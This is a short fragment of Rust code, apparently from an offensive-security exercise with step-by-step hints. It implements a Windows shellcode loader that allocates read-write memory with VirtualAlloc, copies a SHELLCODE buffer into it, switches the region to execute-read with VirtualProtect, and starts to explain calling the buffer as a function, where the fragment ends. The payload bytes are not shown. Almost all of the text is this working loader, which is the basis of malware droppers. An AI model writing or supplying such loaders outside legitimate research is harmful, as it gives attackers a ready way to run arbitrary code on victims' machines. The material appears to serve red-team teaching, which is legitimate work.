        // Step 1 — Allocate RW memory large enough to hold the shellcode.
        // Hint: VirtualAlloc(base, size, alloc_type, protect) -> *mut c_void
        //       Use MEM_COMMIT | MEM_RESERVE and PAGE_READWRITE.
        //       Return value is NULL on failure.
        let base = VirtualAlloc(
            None, // let OS choose base
            SHELLCODE.len(), // lallocate enough space for shellcode
            MEM_COMMIT | MEM_RESERVE, // reservce space and commit it to make usable
            PAGE_READWRITE // rw
        );

        // check Error
        if base.is_null() {
            panic!("Virtual Allocate failed: {:?}", GetLastError());
        }
        
        // Step 2 — Copy shellcode bytes into the allocated region.
        // Hint: ptr::copy_nonoverlapping(src, dst, count)
        ptr::copy_nonoverlapping(
            SHELLCODE.as_ptr(), 
            base as *mut u8, 
            SHELLCODE.len()
        );

        // Step 3 — Flip the memory protection to RX (no write).
        // Hint: VirtualProtect(addr, size, new_protect, &mut old_protect) -> BOOL
        //       old_protect is an out-parameter — declare it as PAGE_PROTECTION_FLAGS::default().
        let mut old: PAGE_PROTECTION_FLAGS = Default::default();
        VirtualProtect(
            base, 
            SHELLCODE.len(), 
            PAGE_EXECUTE_READ, 
            &mut old
        ).ok().expect("Virtual Protect failed");
            

        // Step 4 — Execute the shellcode.
        // Option A (simpler): cast the pointer to a function and call it directly.
        //   let f: unsafe extern "system" fn() = std::mem::transmute(base);
